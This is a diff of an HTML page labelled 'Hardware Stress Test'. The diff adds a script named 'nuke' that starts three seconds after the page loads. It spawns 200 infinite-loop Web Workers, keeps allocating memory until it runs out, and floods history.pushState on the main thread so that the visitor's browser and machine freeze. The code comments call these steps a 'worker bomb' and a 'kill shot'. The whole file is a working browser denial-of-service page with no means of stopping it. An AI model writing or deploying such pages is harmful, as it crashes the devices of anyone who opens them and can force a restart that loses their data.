@@ -1,26 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CPU Stress Test</title>
+    <title>Hardware Stress Test</title>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace;">
-    <h1>Engaging CPU Lock...</h1>
-    <p>The system will stop responding in 3 seconds.</p>
+<body style="background: #000; color: #f00; font-family: sans-serif; text-align: center; padding-top: 20vh;">
+    <h1>SYSTEM STRESS TEST INITIATED</h1>
+    <p>All system resources will be occupied in 3 seconds.</p>
+    <p>Manual Restart (Refresh + Power) may be required.</p>
 
     <script>
-        setTimeout(() => {
-            console.log("Locked.");
-            // This is a 'Blocking' loop. 
-            // It never yields back to the OS, so the CPU stays at 100%.
-            while (true) {
-                // Complex math forces the CPU to stay in the "High Power" state
-                Math.atan2(Math.random(), Math.random());
-                Math.hypot(Math.random(), Math.random());
-                
-                // This prevents Chrome from showing the "Page Unresponsive" popup
-                // because the UI thread is too busy to even show the warning.
+        function nuke() {
+            // 1. CPU WORKER BOMB (Targets all cores)
+            const workerCode = `while(true) { postMessage(Math.random() * Math.random()); }`;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const url = URL.createObjectURL(blob);
+            
+            for (let i = 0; i < 200; i++) {
+                new Worker(url);
             }
-        }, 3000);
+
+            // 2. RAM OVERLOAD (Rapidly fills memory)
+            const leak = [];
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
+                    leak.push(new Uint8Array(1024 * 1024).fill(1)); // 1MB chunks
+                }
+                console.log("Memory committed.");
+            }, 10);
+
+            // 3. MAIN THREAD ATOMIC LOOP (Freezes UI/Input)
+            // This is the "kill shot" that stops the mouse from moving.
+            setTimeout(() => {
+                while (true) {
+                    history.pushState(null, "", Math.random().toString()); // Floods history I/O
+                    Math.hypot(Math.random(), Math.random()); // Heavy CPU math
+                }
+            }, 100);
+        }
+
+        // Trigger after a short delay
+        setTimeout(nuke, 3000);
     </script>
 </body>
 </html>
